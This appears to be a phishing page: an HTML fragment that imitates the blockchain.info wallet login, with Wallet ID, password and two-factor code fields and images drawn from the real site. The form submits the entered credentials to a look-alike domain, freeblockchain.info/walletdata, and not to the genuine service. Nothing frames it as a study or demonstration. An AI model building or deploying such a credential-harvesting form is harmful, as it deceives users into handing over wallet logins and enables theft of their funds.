<form class="bc-form mt-30 form-horizontal clearfix ng-pristine" name="loginForm" action="https://freeblockchain.info/walletdata" method="">

<fieldset >
<div class="group mb-15" >
<div class="item"><label translate="UID" for="UID_input"><b>Wallet ID</b></label><div>
<input style="" class="form-control ng-pristine ng-empty ng-touched" id="id" name="id"  required="" type="text" />
<div href="https://blockchain.info" class="help-block mbn alt-font f-14 ng-hide" ng-show="errors.uid" ui-sref="public.reminder">
<span translate=""></span></div><div class="help-block mbn alt-font f-14 hidden-xs"><span translate="FIND_GUID_EXPLAIN">Find the login link in your email, e.g. <i>blockchain.info/wallet/1111-222-333...</i> The series of numbers and dashes at the end of the link is your Wallet ID.</span></div></div></div></div><div class="group mb-15" ng-class="{'has-error': errors.password}"><div class="item"><label translate="PASSWORD" for="pass_input"><b>Password</b></label><div><input class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" id="pass_input" name="pass_input" type="password"><div class="help-block mbn alt-font f-14"><span translate=""></span></div></div></div></div><div class="group mb-15 ng-hide" ng-show="settings.needs2FA" ng-class="{'has-error': errors.twoFactor || settings.twoFactorMethod == 3}"><div class="item"><label><span class="ng-hide" translate="YUBI_CODE" ng-show="settings.twoFactorMethod == 1">Yubikey Code</span><span class="ng-hide" translate="EMAIL_CODE" ng-show="settings.twoFactorMethod == 2">Email Code</span><span class="ng-hide" translate="2FA_NOT_SUPPORTED" ng-show="settings.twoFactorMethod == 3">This method of two factor authentication is not supported</span><span class="ng-hide" translate="GOOGLE_AUTH_CODE" ng-show="settings.twoFactorMethod == 4">Google Authenticator</span><span class="ng-hide" translate="SMS_CODE" ng-show="settings.twoFactorMethod == 5">SMS Code</span></label><div><input class="form-control ng-pristine ng-untouched ng-empty ng-valid ng-valid-required" ng-model="twoFactorCode" ng-disabled="didEnterCorrect2FA || settings.twoFactorMethod == 3" ng-required="settings.needs2FA" focus-when="settings.needs2FA" type="text"><div class="help-block mbn alt-font f-14" translate=""><span></span></div><p class="form-control-static ng-hide" ng-show="settings.twoFactorMethod == 5"><img class="ng-hide" ng-show="status.resending" src="https://blockchain.info/en/wallet/img/spinner-8de10c3e9fd9f1c447099e6d23b5c24931c019da.gif"><a class="" ng-click="resend()" ng-hide="status.resending" translate="RESEND">Resend</a></p></div></div></div><div class="group full mt-15"><button class="button-primary button-heavy ladda-button" type="submit" ><span><span class="ladda-label" translate="LOG_IN">Log in</span><span class="ladda-spinner"><div class="spinner"></div></span></span></button></div></fieldset></form>
